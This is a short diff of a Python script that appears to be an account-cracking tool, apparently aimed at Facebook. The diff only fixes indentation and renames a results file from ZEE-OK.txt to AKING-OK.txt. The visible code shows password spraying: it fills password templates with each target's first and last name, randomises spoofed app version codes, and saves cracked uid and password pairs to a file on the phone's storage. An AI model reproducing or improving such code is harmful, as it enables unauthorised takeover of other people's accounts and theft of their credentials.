@@ -494,7 +494,7 @@ def api(ids,names,passlist):
                                 ln = names.split(' ')[1]
                         except:
                                 ln = fn
-                       for pw in passlist:
+                        for pw in passlist:
                                 pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -677,7 +677,7 @@ def rndm(ids,passlist):
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/ZEE-OK.txt','r').read()
+                                                okk=open('/sdcard/AKING-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
                                                         print('\r\r\033[1;32m [ZEE-OK] '+uid+' | '+pas+'\033[1;97m')
